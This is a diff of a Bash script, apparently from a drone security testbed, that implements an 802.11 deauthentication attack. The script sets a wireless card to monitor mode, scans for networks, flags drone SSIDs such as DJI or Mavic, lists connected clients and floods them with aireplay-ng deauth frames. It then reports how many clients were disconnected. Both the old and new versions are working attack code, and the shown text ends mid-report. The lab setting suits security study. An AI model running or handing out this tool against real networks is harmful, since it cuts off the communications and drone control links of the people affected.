@@ -1,466 +1,698 @@
 #!/bin/bash
+# wifi_deauth.sh - WiFi 인증 해제 공격 도구
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/wifi_deauth.sh
 
-# =============================================================================
-# DVD DoS Attack Module: WiFi Deauthentication Attack
-# =============================================================================
-# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/wifi_deauth.sh
-# 목적: WiFi 네트워크에서 클라이언트 강제 연결 해제를 통한 통신 차단
-# 작성자: MTD Testbed Team
-# =============================================================================
+source "$(dirname "$0")/../common/colors.sh"
+source "$(dirname "$0")/../common/utils.sh"
 
-# 공통 모듈 로드
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh
-
-# 전역 변수
 ATTACK_NAME="WiFi Deauthentication Attack"
-ATTACK_TYPE="DENIAL_OF_SERVICE"
-INTERFACE=""
-TARGET_BSSID=""
-TARGET_CHANNEL=""
-DEAUTH_COUNT=100
-LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/wifi_deauth_$(date +%Y%m%d_%H%M%S).log"
-IOC_FILE="/tmp/wifi_deauth_iocs.txt"
-JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/wifi_deauth_report_$(date +%Y%m%d_%H%M%S).json"
+LOG_FILE="$(get_log_dir)/wifi_deauth.log"
 
-# 드론 관련 WiFi 네트워크 패턴
-DRONE_SSID_PATTERNS=("DJI" "MAVIC" "PHANTOM" "ArduPilot" "PX4" "Drone_" "UAV_" "Copter_" "Quad_")
-
-# 헤더 출력
-print_header() {
-    clear
-    echo -e "${BOLD}${RED}"
-    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
-    echo "║                      📡 DVD WiFi Deauth Attack 📡                       ║"
-    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
+print_banner() {
+    echo -e "${CYAN}"
+    echo "╔═══════════════════════════════════════╗"
+    echo "║           Wifi Deauth attack          ║"
+    echo "╚═══════════════════════════════════════╝"
     echo -e "${NC}"
-    echo -e "${BLUE}Target: Drone WiFi Networks${NC}"
-    echo -e "${BLUE}Method: 802.11 Deauthentication Frames${NC}"
-    echo -e "${BLUE}Impact: Communication Link Disruption${NC}"
-    echo ""
 }
 
-# WiFi 인터페이스 설정
-setup_interface() {
-    echo -e "${YELLOW}[+] Setting up WiFi interface for monitor mode...${NC}" | tee -a "$LOG_FILE"
+check_prerequisites() {
+    log_info "Checking prerequisites..."
     
-    # 사용 가능한 무선 인터페이스 확인
-    local interfaces=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*' | grep -E '^(wlan|wlp)'))
+    local required_tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng" "iwconfig")
+    for tool in "${required_tools[@]}"; do
+        if ! command -v "$tool" &> /dev/null; then
+            log_error "$tool is not installed"
+            echo "Install with: sudo apt-get install aircrack-ng"
+            exit 1
+        fi
+    done
     
-    if [ ${#interfaces[@]} -eq 0 ]; then
-        echo -e "${RED}[!] No WiFi interfaces found${NC}" | tee -a "$LOG_FILE"
+    # 루트 권한 확인
+    if [[ $EUID -ne 0 ]]; then
+        log_error "This attack requires root privileges"
+        echo "Run with: sudo $0"
+        exit 1
+    fi
+    
+    log_success "Prerequisites check completed"
+}
+
+detect_wireless_interfaces() {
+    log_info "Detecting wireless interfaces..."
+    
+    local interfaces=()
+    local monitor_interfaces=()
+    
+    # 일반 인터페이스 탐지
+    while IFS= read -r line; do
+        if [[ $line =~ ^[[:space:]]*([^[:space:]]+)[[:space:]]+IEEE[[:space:]]802.11 ]]; then
+            local iface="${BASH_REMATCH[1]}"
+            interfaces+=("$iface")
+        fi
+    done < <(iwconfig 2>/dev/null)
+    
+    # 모니터 모드 인터페이스 탐지
+    while IFS= read -r line; do
+        if [[ $line =~ mon[0-9]+ ]]; then
+            monitor_interfaces+=("${BASH_REMATCH[0]}")
+        fi
+    done < <(iwconfig 2>/dev/null)
+    
+    echo -e "${CYAN}Available wireless interfaces:${NC}"
+    for iface in "${interfaces[@]}"; do
+        echo "  └─ $iface (managed mode)"
+    done
+    
+    for mon_iface in "${monitor_interfaces[@]}"; do
+        echo "  └─ $mon_iface (monitor mode)"
+    done
+    
+    # 최적 인터페이스 선택
+    if [[ ${#monitor_interfaces[@]} -gt 0 ]]; then
+        echo "${monitor_interfaces[0]}"
+    elif [[ ${#interfaces[@]} -gt 0 ]]; then
+        echo "${interfaces[0]}"
+    else
+        echo ""
+    fi
+}
+
+setup_monitor_mode() {
+    local interface="$1"
+    
+    log_info "Setting up monitor mode on $interface..."
+    
+    # 이미 모니터 모드인지 확인
+    if iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
+        log_success "Interface $interface already in monitor mode"
+        echo "$interface"
+        return
+    fi
+    
+    # 인터페이스 다운
+    echo -e "${YELLOW}[*] Bringing down interface $interface...${NC}"
+    ip link set "$interface" down 2>/dev/null
+    
+    # 기존 프로세스 종료
+    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
+    airmon-ng check kill >/dev/null 2>&1
+    
+    # 모니터 모드 시작
+    echo -e "${YELLOW}[*] Starting monitor mode...${NC}"
+    local monitor_output=$(airmon-ng start "$interface" 2>/dev/null)
+    
+    # 모니터 인터페이스 이름 추출
+    local monitor_iface=""
+    if echo "$monitor_output" | grep -q "monitor mode enabled"; then
+        monitor_iface=$(echo "$monitor_output" | grep -o '[a-zA-Z0-9]*mon[a-zA-Z0-9]*' | head -1)
+        if [[ -z "$monitor_iface" ]]; then
+            monitor_iface="${interface}mon"
+        fi
+    else
+        log_error "Failed to enable monitor mode"
         return 1
     fi
     
-    # 첫 번째 인터페이스 사용
-    INTERFACE=${interfaces[0]}
-    echo -e "${GREEN}[✓] Using interface: ${INTERFACE}${NC}" | tee -a "$LOG_FILE"
-    
-    # 인터페이스 다운
-    ip link set "$INTERFACE" down 2>/dev/null
-    
-    # 모니터 모드 설정
-    if iwconfig "$INTERFACE" mode monitor 2>/dev/null; then
-        echo -e "${GREEN}[✓] Monitor mode enabled on ${INTERFACE}${NC}" | tee -a "$LOG_FILE"
+    # 확인
+    if iwconfig "$monitor_iface" 2>/dev/null | grep -q "Mode:Monitor"; then
+        log_success "Monitor mode enabled on $monitor_iface"
+        echo "$monitor_iface"
     else
-        echo -e "${YELLOW}[*] Trying with airmon-ng...${NC}" | tee -a "$LOG_FILE"
-        if command -v airmon-ng &> /dev/null; then
-            airmon-ng start "$INTERFACE" 2>&1 | tee -a "$LOG_FILE"
-            # 모니터 인터페이스 이름 업데이트 (예: wlan0mon)
-            INTERFACE="${INTERFACE}mon"
-        else
-            echo -e "${RED}[!] Failed to enable monitor mode${NC}" | tee -a "$LOG_FILE"
-            return 1
-        fi
+        log_error "Failed to verify monitor mode"
+        return 1
     fi
-    
-    # 인터페이스 업
-    ip link set "$INTERFACE" up
-    
-    echo "DOS_SETUP:MONITOR_MODE_${INTERFACE}" >> "$IOC_FILE"
-    return 0
 }
 
-# 드론 네트워크 스캔
-scan_drone_networks() {
-    echo -e "${CYAN}[*] Scanning for drone WiFi networks...${NC}" | tee -a "$LOG_FILE"
+scan_networks() {
+    local monitor_iface="$1"
+    local scan_duration="${2:-20}"
     
-    # airodump-ng로 네트워크 스캔
-    local scan_file="/tmp/drone_scan"
+    log_info "Scanning for WiFi networks..."
     
-    # 짧은 스캔 실행
-    timeout 15s airodump-ng --write "$scan_file" --output-format csv "$INTERFACE" 2>/dev/null &
+    local scan_file="/tmp/wifi_scan_$(date +%s)"
+    
+    echo -e "${YELLOW}[*] Starting network scan for ${scan_duration} seconds...${NC}"
+    echo -e "${CYAN}[*] Press Ctrl+C to stop scan early${NC}"
+    
+    # airodump-ng 백그라운드 실행
+    timeout "$scan_duration" airodump-ng "$monitor_iface" \
+        --write "$scan_file" \
+        --output-format csv 2>/dev/null &
+    
+    local airodump_pid=$!
+    
+    # 스캔 진행 상황 표시
+    local count=0
+    while kill -0 $airodump_pid 2>/dev/null && [[ $count -lt $scan_duration ]]; do
+        sleep 1
+        ((count++))
+        echo -ne "\r${GREEN}[*] Scanning... ${count}/${scan_duration}s${NC}"
+    done
+    echo ""
+    
+    wait $airodump_pid 2>/dev/null
+    
+    # 결과 파일 확인
+    local csv_file="${scan_file}-01.csv"
+    if [[ ! -f "$csv_file" ]]; then
+        log_error "Scan failed - no results file found"
+        return 1
+    fi
+    
+    echo "$csv_file"
+}
+
+parse_scan_results() {
+    local csv_file="$1"
+    
+    log_info "Parsing scan results..."
+    
+    # CSV 파일에서 네트워크 정보 추출
+    local networks=()
+    
+    # 헤더 라인 찾기
+    local ap_section_start=$(grep -n "BSSID, First time seen" "$csv_file" | cut -d: -f1)
+    local station_section_start=$(grep -n "Station MAC, First time seen" "$csv_file" | cut -d: -f1)
+    
+    if [[ -z "$ap_section_start" ]]; then
+        log_error "Invalid scan results format"
+        return 1
+    fi
+    
+    # 스테이션 섹션이 없으면 파일 끝까지
+    if [[ -z "$station_section_start" ]]; then
+        station_section_start=$(wc -l < "$csv_file")
+    fi
+    
+    echo -e "${GREEN}=== Discovered Networks ===${NC}"
+    
+    # AP 정보 파싱
+    local ap_count=0
+    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
+        # 빈 라인이나 헤더 스킵
+        [[ -z "$bssid" || "$bssid" =~ ^[[:space:]]*BSSID ]] && continue
+        
+        # 공백 제거
+        bssid=$(echo "$bssid" | tr -d ' ')
+        essid=$(echo "$essid" | tr -d ' ')
+        channel=$(echo "$channel" | tr -d ' ')
+        privacy=$(echo "$privacy" | tr -d ' ')
+        power=$(echo "$power" | tr -d ' ')
+        
+        # 유효한 BSSID인지 확인
+        if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+            ((ap_count++))
+            
+            # ESSID가 비어있으면 <hidden> 표시
+            [[ -z "$essid" ]] && essid="<hidden>"
+            
+            # 보안 타입 결정
+            local security="Open"
+            if [[ "$privacy" =~ WPA3 ]]; then
+                security="WPA3"
+            elif [[ "$privacy" =~ WPA2 ]]; then
+                security="WPA2"
+            elif [[ "$privacy" =~ WPA ]]; then
+                security="WPA"
+            elif [[ "$privacy" =~ WEP ]]; then
+                security="WEP"
+            fi
+            
+            # 드론 관련 네트워크 식별
+            local drone_indicator=""
+            if [[ "$essid" =~ (drone|Drone|DRONE|mavic|Mavic|MAVIC|phantom|Phantom|PHANTOM|DJI|dji) ]]; then
+                drone_indicator=" ${RED}[DRONE NETWORK]${NC}"
+            fi
+            
+            echo -e "${CYAN}[$ap_count] $essid${NC}$drone_indicator"
+            echo "    └─ BSSID: $bssid"
+            echo "    └─ Channel: $channel"
+            echo "    └─ Security: $security"
+            echo "    └─ Signal: ${power} dBm"
+            echo ""
+            
+            # 네트워크 정보 저장
+            networks+=("$ap_count:$bssid:$essid:$channel:$security:$power")
+        fi
+    done < <(sed -n "${ap_section_start},$((station_section_start-1))p" "$csv_file" | tail -n +2)
+    
+    if [[ $ap_count -eq 0 ]]; then
+        log_warning "No networks found"
+        return 1
+    fi
+    
+    log_success "Found $ap_count networks"
+    
+    # 네트워크 배열을 global 변수로 export
+    declare -g DISCOVERED_NETWORKS=("${networks[@]}")
+}
+
+select_target_network() {
+    log_info "Selecting target network..."
+    
+    if [[ ${#DISCOVERED_NETWORKS[@]} -eq 0 ]]; then
+        log_error "No networks available for selection"
+        return 1
+    fi
+    
+    echo -e "${YELLOW}[?] Select target network (1-${#DISCOVERED_NETWORKS[@]}) or 'auto' for drone networks: ${NC}"
+    read -t 30 selection
+    
+    local target_network=""
+    
+    if [[ "$selection" == "auto" ]]; then
+        # 자동으로 드론 네트워크 선택
+        for network in "${DISCOVERED_NETWORKS[@]}"; do
+            local essid=$(echo "$network" | cut -d: -f3)
+            if [[ "$essid" =~ (drone|Drone|DRONE|mavic|Mavic|MAVIC|phantom|Phantom|PHANTOM|DJI|dji) ]]; then
+                target_network="$network"
+                break
+            fi
+        done
+        
+        if [[ -z "$target_network" ]]; then
+            log_warning "No drone networks found, selecting first network"
+            target_network="${DISCOVERED_NETWORKS[0]}"
+        fi
+    elif [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le ${#DISCOVERED_NETWORKS[@]} ]]; then
+        target_network="${DISCOVERED_NETWORKS[$((selection-1))]}"
+    else
+        log_warning "Invalid selection, using first network"
+        target_network="${DISCOVERED_NETWORKS[0]}"
+    fi
+    
+    # 타겟 정보 추출
+    local target_id=$(echo "$target_network" | cut -d: -f1)
+    local target_bssid=$(echo "$target_network" | cut -d: -f2)
+    local target_essid=$(echo "$target_network" | cut -d: -f3)
+    local target_channel=$(echo "$target_network" | cut -d: -f4)
+    local target_security=$(echo "$target_network" | cut -d: -f5)
+    
+    echo -e "${GREEN}Target Selected:${NC}"
+    echo "  └─ ESSID: $target_essid"
+    echo "  └─ BSSID: $target_bssid"
+    echo "  └─ Channel: $target_channel"
+    echo "  └─ Security: $target_security"
+    
+    echo "$target_bssid:$target_essid:$target_channel"
+}
+
+scan_clients() {
+    local monitor_iface="$1"
+    local target_bssid="$2"
+    local target_channel="$3"
+    local scan_duration="${4:-15}"
+    
+    log_info "Scanning for connected clients..."
+    
+    # 채널 고정
+    iwconfig "$monitor_iface" channel "$target_channel" 2>/dev/null
+    
+    local client_scan_file="/tmp/client_scan_$(date +%s)"
+    
+    echo -e "${YELLOW}[*] Scanning for clients on channel $target_channel for ${scan_duration} seconds...${NC}"
+    
+    # 특정 BSSID만 스캔
+    timeout "$scan_duration" airodump-ng "$monitor_iface" \
+        --bssid "$target_bssid" \
+        --channel "$target_channel" \
+        --write "$client_scan_file" \
+        --output-format csv 2>/dev/null &
+    
     local scan_pid=$!
     
-    echo -e "${YELLOW}[*] Scanning networks for 15 seconds...${NC}"
-    
-    # 진행률 표시
-    for i in {1..15}; do
-        printf "\r${BLUE}[*] Scanning: [%-15s] %d/15s${NC}" \
-               "$(printf "%*s" "$i" | tr ' ' '=')" "$i"
+    # 진행 상황 표시
+    local count=0
+    while kill -0 $scan_pid 2>/dev/null && [[ $count -lt $scan_duration ]]; do
         sleep 1
+        ((count++))
+        echo -ne "\r${GREEN}[*] Client scanning... ${count}/${scan_duration}s${NC}"
     done
     echo ""
     
     wait $scan_pid 2>/dev/null
     
-    # 스캔 결과 분석
-    if [ -f "${scan_file}-01.csv" ]; then
-        echo -e "${GREEN}[✓] Network scan completed${NC}" | tee -a "$LOG_FILE"
+    # 클라이언트 결과 파싱
+    local csv_file="${client_scan_file}-01.csv"
+    if [[ ! -f "$csv_file" ]]; then
+        log_warning "No client scan results found"
+        echo ""
+        return
+    fi
+    
+    local clients=()
+    local station_section_start=$(grep -n "Station MAC, First time seen" "$csv_file" | cut -d: -f1)
+    
+    if [[ -n "$station_section_start" ]]; then
+        echo -e "${GREEN}=== Connected Clients ===${NC}"
         
-        # 드론 네트워크 필터링
-        local drone_networks=()
-        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
-            # 헤더 라인 스킵
-            [[ "$bssid" == "BSSID" ]] && continue
+        local client_count=0
+        while IFS=',' read -r station_mac first_seen last_seen power packets bssid probed_essids; do
+            # 빈 라인이나 헤더 스킵
+            [[ -z "$station_mac" || "$station_mac" =~ ^[[:space:]]*Station ]] && continue
             
-            # ESSID가 비어있으면 스킵
-            [[ -z "$essid" || "$essid" == " " ]] && continue
+            # 공백 제거
+            station_mac=$(echo "$station_mac" | tr -d ' ')
+            bssid=$(echo "$bssid" | tr -d ' ')
+            power=$(echo "$power" | tr -d ' ')
             
-            # 드론 패턴 매칭
-            for pattern in "${DRONE_SSID_PATTERNS[@]}"; do
-                if [[ "$essid" =~ $pattern ]]; then
-                    drone_networks+=("$bssid,$channel,$essid")
-                    echo -e "${GREEN}[+] Found drone network: ${essid} (${bssid}) on channel ${channel}${NC}" | tee -a "$LOG_FILE"
-                    echo "DOS_TARGET:DRONE_NETWORK_${essid}_${bssid}" >> "$IOC_FILE"
-                    break
-                fi
-            done
-        done < "${scan_file}-01.csv"
+            # 유효한 MAC 주소이고 타겟 BSSID와 연결된 경우
+            if [[ $station_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" == "$target_bssid" ]]; then
+                ((client_count++))
+                echo -e "${CYAN}[$client_count] Client: $station_mac${NC}"
+                echo "    └─ Signal: ${power} dBm"
+                echo "    └─ Connected to: $target_bssid"
+                
+                clients+=("$station_mac")
+            fi
+        done < <(tail -n +$((station_section_start + 1)) "$csv_file")
         
-        # 스캔 파일 정리
-        rm -f "${scan_file}"-*.csv 2>/dev/null
-        
-        if [ ${#drone_networks[@]} -gt 0 ]; then
-            echo -e "${CYAN}[*] Found ${#drone_networks[@]} drone networks${NC}" | tee -a "$LOG_FILE"
-            
-            # 첫 번째 드론 네트워크를 타겟으로 선택
-            IFS=',' read -r TARGET_BSSID TARGET_CHANNEL target_essid <<< "${drone_networks[0]}"
-            echo -e "${YELLOW}[*] Selected target: ${target_essid} (${TARGET_BSSID})${NC}" | tee -a "$LOG_FILE"
-            
-            return 0
+        if [[ $client_count -eq 0 ]]; then
+            echo -e "${YELLOW}No active clients found${NC}"
         else
-            echo -e "${RED}[!] No drone networks found${NC}" | tee -a "$LOG_FILE"
-            return 1
+            log_success "Found $client_count connected clients"
         fi
-    else
-        echo -e "${RED}[!] Network scan failed${NC}" | tee -a "$LOG_FILE"
-        return 1
     fi
+    
+    # 클라이언트 목록 반환 (공백으로 구분)
+    echo "${clients[*]}"
 }
 
-# 타겟 채널 설정
-set_target_channel() {
-    if [ -n "$TARGET_CHANNEL" ]; then
-        echo -e "${YELLOW}[+] Setting interface to channel ${TARGET_CHANNEL}${NC}" | tee -a "$LOG_FILE"
-        iwconfig "$INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null
-        
-        # 채널 설정 확인
-        local current_channel=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Frequency" | awk '{print $4}' | cut -d: -f2)
-        echo -e "${GREEN}[✓] Interface set to channel ${TARGET_CHANNEL}${NC}" | tee -a "$LOG_FILE"
-        
-        echo "DOS_CONFIG:CHANNEL_${TARGET_CHANNEL}" >> "$IOC_FILE"
-    fi
-}
-
-# 클라이언트 스캔
-scan_clients() {
-    local bssid=$1
-    local channel=$2
+execute_deauth_attack() {
+    local monitor_iface="$1"
+    local target_bssid="$2"
+    local target_essid="$3"
+    local target_channel="$4"
+    local clients_list="$5"
+    local attack_duration="${6:-60}"
     
-    echo -e "${CYAN}[*] Scanning for clients on ${bssid}...${NC}" | tee -a "$LOG_FILE"
+    log_info "Executing WiFi deauthentication attack..."
     
-    local client_scan="/tmp/client_scan"
+    # 채널 설정
+    iwconfig "$monitor_iface" channel "$target_channel" 2>/dev/null
     
-    # 클라이언트 스캔 (짧은 시간)
-    timeout 10s airodump-ng --write "$client_scan" --output-format csv \
-                            --channel "$channel" --bssid "$bssid" "$INTERFACE" 2>/dev/null &
-    
-    echo -e "${YELLOW}[*] Scanning clients for 10 seconds...${NC}"
-    
-    for i in {1..10}; do
-        printf "\r${BLUE}[*] Client scan: [%-10s] %d/10s${NC}" \
-               "$(printf "%*s" "$i" | tr ' ' '=')" "$i"
-        sleep 1
-    done
+    echo -e "${RED}[!] Starting deauthentication attack${NC}"
+    echo -e "${CYAN}Target Network: $target_essid ($target_bssid)${NC}"
+    echo -e "${CYAN}Attack Duration: ${attack_duration} seconds${NC}"
+    echo -e "${CYAN}Press Ctrl+C to stop attack${NC}"
     echo ""
     
-    wait 2>/dev/null
+    # 공격 시작 시간 기록
+    local start_time=$(date +%s)
+    local frames_sent=0
     
-    # 클라이언트 정보 추출
-    local clients=()
-    if [ -f "${client_scan}-01.csv" ]; then
-        # CSV 파일에서 클라이언트 정보 추출
-        awk -F',' '/^[0-9A-Fa-f:]{17}/ && NF > 5 { print $1 }' "${client_scan}-01.csv" | while read -r client_mac; do
-            if [ -n "$client_mac" ] && [ "$client_mac" != "$bssid" ]; then
-                clients+=("$client_mac")
-                echo -e "${GREEN}[+] Found client: ${client_mac}${NC}" | tee -a "$LOG_FILE"
-                echo "DOS_TARGET:CLIENT_${client_mac}" >> "$IOC_FILE"
+    if [[ -n "$clients_list" ]]; then
+        # 특정 클라이언트들 대상 공격
+        echo -e "${YELLOW}[*] Targeting specific clients...${NC}"
+        
+        local clients_array=($clients_list)
+        for client in "${clients_array[@]}"; do
+            echo -e "${YELLOW}[*] Deauthenticating client: $client${NC}"
+            
+            # 클라이언트별 공격 (백그라운드)
+            (
+                while [[ $(($(date +%s) - start_time)) -lt $attack_duration ]]; do
+                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$client" "$monitor_iface" 2>/dev/null
+                    ((frames_sent += 5))
+                    sleep 2
+                done
+            ) &
+        done
+    else
+        # 브로드캐스트 공격 (모든 클라이언트)
+        echo -e "${YELLOW}[*] Broadcasting deauth frames to all clients...${NC}"
+        
+        (
+            while [[ $(($(date +%s) - start_time)) -lt $attack_duration ]]; do
+                aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_iface" 2>/dev/null
+                ((frames_sent += 10))
+                sleep 1
+            done
+        ) &
+    fi
+    
+    # 공격 진행 상황 모니터링
+    local elapsed=0
+    while [[ $elapsed -lt $attack_duration ]]; do
+        sleep 5
+        elapsed=$(($(date +%s) - start_time))
+        
+        local remaining=$((attack_duration - elapsed))
+        echo -e "\r${GREEN}[*] Attack progress: ${elapsed}s / ${attack_duration}s (${remaining}s remaining)${NC}"
+    done
+    
+    # 모든 백그라운드 프로세스 종료
+    pkill -f "aireplay-ng.*--deauth" 2>/dev/null
+    
+    echo ""
+    log_success "Deauthentication attack completed"
+    echo -e "${CYAN}Estimated frames sent: $frames_sent${NC}"
+    
+    # 공격 결과 반환
+    echo "$frames_sent:$elapsed"
+}
+
+monitor_attack_effectiveness() {
+    local monitor_iface="$1"
+    local target_bssid="$2"
+    local target_channel="$3"
+    local pre_attack_clients="$4"
+    
+    log_info "Monitoring attack effectiveness..."
+    
+    echo -e "${YELLOW}[*] Checking client disconnections...${NC}"
+    
+    # 공격 후 클라이언트 재스캔 (짧은 시간)
+    local post_attack_clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 10)
+    
+    # 클라이언트 수 비교
+    local pre_count=$(echo "$pre_attack_clients" | wc -w)
+    local post_count=$(echo "$post_attack_clients" | wc -w)
+    
+    echo -e "${GREEN}=== Attack Effectiveness ===${NC}"
+    echo "  └─ Clients before attack: $pre_count"
+    echo "  └─ Clients after attack: $post_count"
+    echo "  └─ Clients disconnected: $((pre_count - post_count))"
+    
+    # 개별 클라이언트 상태 확인
+    if [[ -n "$pre_attack_clients" ]]; then
+        echo -e "${CYAN}Client Status:${NC}"
+        local pre_array=($pre_attack_clients)
+        local post_array=($post_attack_clients)
+        
+        for client in "${pre_array[@]}"; do
+            if [[ " ${post_array[*]} " =~ " ${client} " ]]; then
+                echo "  └─ $client: ${YELLOW}Still connected${NC}"
+            else
+                echo "  └─ $client: ${RED}Disconnected${NC}"
             fi
         done
-        
-        rm -f "${client_scan}"-*.csv 2>/dev/null
     fi
     
-    return 0
+    # 재연결 모니터링
+    echo -e "${YELLOW}[*] Monitoring for reconnections (30s)...${NC}"
+    local reconnect_clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 30)
+    local reconnect_count=$(echo "$reconnect_clients" | wc -w)
+    
+    echo "  └─ Clients reconnected: $reconnect_count"
+    
+    local effectiveness=$((((pre_count - post_count) * 100) / (pre_count > 0 ? pre_count : 1)))
+    echo "  └─ Attack effectiveness: ${effectiveness}%"
 }
 
-# Deauthentication 공격 실행
-execute_deauth_attack() {
-    local bssid=$1
-    local client=${2:-"FF:FF:FF:FF:FF:FF"}  # 브로드캐스트가 기본값
-    local count=$3
+generate_attack_report() {
+    local target_bssid="$1"
+    local target_essid="$2"
+    local attack_results="$3"
+    local effectiveness="$4"
     
-    echo -e "${YELLOW}[+] Executing deauth attack on ${bssid}${NC}" | tee -a "$LOG_FILE"
+    log_info "Generating attack report..."
     
-    if [ "$client" == "FF:FF:FF:FF:FF:FF" ]; then
-        echo -e "${CYAN}[*] Broadcasting deauth to all clients${NC}" | tee -a "$LOG_FILE"
-    else
-        echo -e "${CYAN}[*] Targeting specific client: ${client}${NC}" | tee -a "$LOG_FILE"
-    fi
+    local frames_sent=$(echo "$attack_results" | cut -d: -f1)
+    local attack_duration=$(echo "$attack_results" | cut -d: -f2)
     
-    # aireplay-ng로 deauth 공격
-    if command -v aireplay-ng &> /dev/null; then
-        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$INTERFACE" 2>&1 | tee -a "$LOG_FILE" &
-        local deauth_pid=$!
-        
-        echo "DOS_ATTACK:DEAUTH_${bssid}_${client}_${count}" >> "$IOC_FILE"
-        
-        # 공격 진행률 표시
-        local duration=$((count / 10))  # 대략적인 지속 시간 계산
-        for ((i=1; i<=duration; i++)); do
-            printf "\r${RED}[*] Deauth in progress: [%-20s] %d/${duration}s${NC}" \
-                   "$(printf "%*s" $((i*20/duration)) | tr ' ' '=')" "$i"
-            sleep 1
-        done
-        echo ""
-        
-        wait $deauth_pid 2>/dev/null
-        echo -e "${GREEN}[✓] Deauth attack completed${NC}" | tee -a "$LOG_FILE"
-        
-    else
-        echo -e "${RED}[!] aireplay-ng not found${NC}" | tee -a "$LOG_FILE"
-        
-        # mdk3를 대안으로 시도
-        if command -v mdk3 &> /dev/null; then
-            echo -e "${YELLOW}[*] Using mdk3 as fallback...${NC}" | tee -a "$LOG_FILE"
-            echo "$bssid" > /tmp/target_ap.txt
-            timeout 30s mdk3 "$INTERFACE" d -t /tmp/target_ap.txt 2>&1 | tee -a "$LOG_FILE"
-            rm -f /tmp/target_ap.txt
-            
-            echo "DOS_ATTACK:MDK3_DEAUTH_${bssid}" >> "$IOC_FILE"
-        else
-            echo -e "${RED}[!] No deauth tools available${NC}" | tee -a "$LOG_FILE"
-            return 1
-        fi
-    fi
+    local report_file="$(get_log_dir)/wifi_deauth_report_$(date +%Y%m%d_%H%M%S).txt"
     
-    return 0
-}
+    cat > "$report_file" << EOF
+╔═══════════════════════════════════════════════════╗
+║             WIFI DEAUTH REPORT                    ║
+╚═══════════════════════════════════════════════════╝
 
-# 공격 효과 모니터링
-monitor_attack_effectiveness() {
-    echo -e "${CYAN}[*] Monitoring attack effectiveness...${NC}" | tee -a "$LOG_FILE"
-    
-    # 네트워크 트래픽 모니터링
-    local before_traffic=$(cat /proc/net/dev | grep "$INTERFACE" | awk '{print $2 + $10}')
-    sleep 5
-    local after_traffic=$(cat /proc/net/dev | grep "$INTERFACE" | awk '{print $2 + $10}')
-    
-    local traffic_increase=$((after_traffic - before_traffic))
-    
-    echo -e "${GREEN}[✓] Attack Impact Assessment:${NC}" | tee -a "$LOG_FILE"
-    echo "    Network Traffic Increase: ${traffic_increase} bytes" | tee -a "$LOG_FILE"
-    echo "    Deauth Frames Sent: ${DEAUTH_COUNT}" | tee -a "$LOG_FILE"
-    echo "    Attack Duration: ~30 seconds" | tee -a "$LOG_FILE"
-    
-    # IOCs 업데이트
-    echo "DOS_IMPACT:TRAFFIC_INCREASE_${traffic_increase}" >> "$IOC_FILE"
-    echo "DOS_IMPACT:DEAUTH_FRAMES_${DEAUTH_COUNT}" >> "$IOC_FILE"
-    echo "DOS_IMPACT:COMMUNICATION_DISRUPTED" >> "$IOC_FILE"
-}
+Date: $(date)
+Attack Type: WiFi Deauthentication
+Target Network: $target_essid
+Target BSSID: $target_bssid
 
-# 인터페이스 복원
-restore_interface() {
-    echo -e "${YELLOW}[+] Restoring interface ${INTERFACE}...${NC}" | tee -a "$LOG_FILE"
-    
-    # 모니터 모드 해제
-    if [[ "$INTERFACE" =~ mon$ ]]; then
-        local base_interface=${INTERFACE%mon}
-        if command -v airmon-ng &> /dev/null; then
-            airmon-ng stop "$INTERFACE" 2>&1 | tee -a "$LOG_FILE"
-        fi
-        INTERFACE="$base_interface"
-    fi
-    
-    # 관리 모드로 복원
-    ip link set "$INTERFACE" down 2>/dev/null
-    iwconfig "$INTERFACE" mode managed 2>/dev/null
-    ip link set "$INTERFACE" up 2>/dev/null
-    
-    echo -e "${GREEN}[✓] Interface restored to managed mode${NC}" | tee -a "$LOG_FILE"
-    echo "DOS_CLEANUP:INTERFACE_RESTORED_${INTERFACE}" >> "$IOC_FILE"
-}
+╔═══ ATTACK SUMMARY ═══╗
 
-# JSON 리포트 생성
-generate_json_report() {
-    local start_time=$1
-    local end_time=$2
-    
-    cat > "$JSON_OUTPUT" << EOF
-{
-    "attack_info": {
-        "name": "$ATTACK_NAME",
-        "type": "$ATTACK_TYPE",
-        "timestamp": "$(date -Iseconds)",
-        "duration": $((end_time - start_time)),
-        "status": "completed"
-    },
-    "target_details": {
-        "target_bssid": "$TARGET_BSSID",
-        "target_channel": "$TARGET_CHANNEL",
-        "interface_used": "$INTERFACE",
-        "attack_method": "802.11 Deauthentication"
-    },
-    "attack_parameters": {
-        "deauth_count": $DEAUTH_COUNT,
-        "attack_type": "broadcast_deauth",
-        "tools_used": ["aireplay-ng", "airodump-ng"]
-    },
-    "impact_assessment": {
-        "communication_disruption": "HIGH",
-        "client_disconnection": "LIKELY",
-        "network_availability": "DEGRADED",
-        "detection_probability": "MEDIUM"
-    },
-    "iocs_generated": $(wc -l < "$IOC_FILE"),
-    "log_file": "$LOG_FILE",
